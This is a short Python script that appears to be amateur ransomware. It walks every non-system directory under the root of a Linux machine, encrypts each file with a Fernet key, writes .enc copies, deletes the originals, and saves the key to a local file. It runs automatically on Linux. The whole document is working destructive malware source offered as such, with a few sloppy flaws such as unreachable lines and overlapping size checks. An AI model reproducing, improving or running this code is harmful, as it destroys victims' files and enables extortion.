# ############>>>>>>>>>> Write aboute Fuck0Fcosiety <<<<<<<<<############
#!/bin/python3

import os
import platform
import socket
from cryptography.fernet import Fernet


def check_os():
    return platform.system()


check_os()


def loop_user_files():
    user_files = []
    user_dirs = []

    system_dirs = [
        "bin", "sbin", "etc", "lib", "boot", "dev",
        "proc", "sys", "run", "tmp", "usr", "var",
        "opt", "srv"
    ]

    # get directory user
    for list_dirs in os.listdir("/"):
        if list_dirs not in system_dirs:
            user_dirs.append("/" + list_dirs)

    print(len(user_dirs))

    # get file every directory
    for user_dir in user_dirs:
        try:
            for root, dirs, files in os.walk(user_dir):
                for file in files:
                    file_path = os.path.join(root, file)

                    if file_path not in user_files:
                        user_files.append(file_path)

        except Exception as e:
            continue

    return user_files, user_dirs

    print("[+] done append file in list")
    print(f"[+]we have {len(user_files)} file wait encryp")


def encryption_file_linux():
    user_files, user_dirs = loop_user_files()

    # create key
    key = Fernet.generate_key()

    with open("key.key", "wb") as k:
        k.write(key)

    fernet = Fernet(key)

    for file in user_files:
        size_file_bytes = os.path.getsize(file)
        size_file_mega = round(size_file_bytes / 1024 / 1024)
        print(f"+] File size {size_file_mega}")

        try:
            if size_file_mega >= 5:  # encryption big file

                with open(file, "rb") as f_R:
                    while chunk := f_R.read(1024 * 1024):
                        enc_chunk_data = fernet.encrypt(chunk)

                        with open(file + ".enc", "ab") as f_W:
                            f_W.write(enc_chunk_data)

                try:
                    os.remove(file)

                except PermissionError:
                    os.replace(file + ".enc", file)

            elif size_file_mega <= 5:  # encryption small file

                with open(file, "rb") as f_R:
                    data_file = f_R.read()
                    enc_data = fernet.encrypt(data_file)

                with open(file + ".enc", "ab") as f_W:
                    f_W.write(enc_data)

                try:
                    os.remove(file)

                except PermissionError:
                    os.replace(file + ".enc", file)

        except Exception:
            continue


if check_os() == "Linux":
    encryption_file_linux()
    loop_user_files()
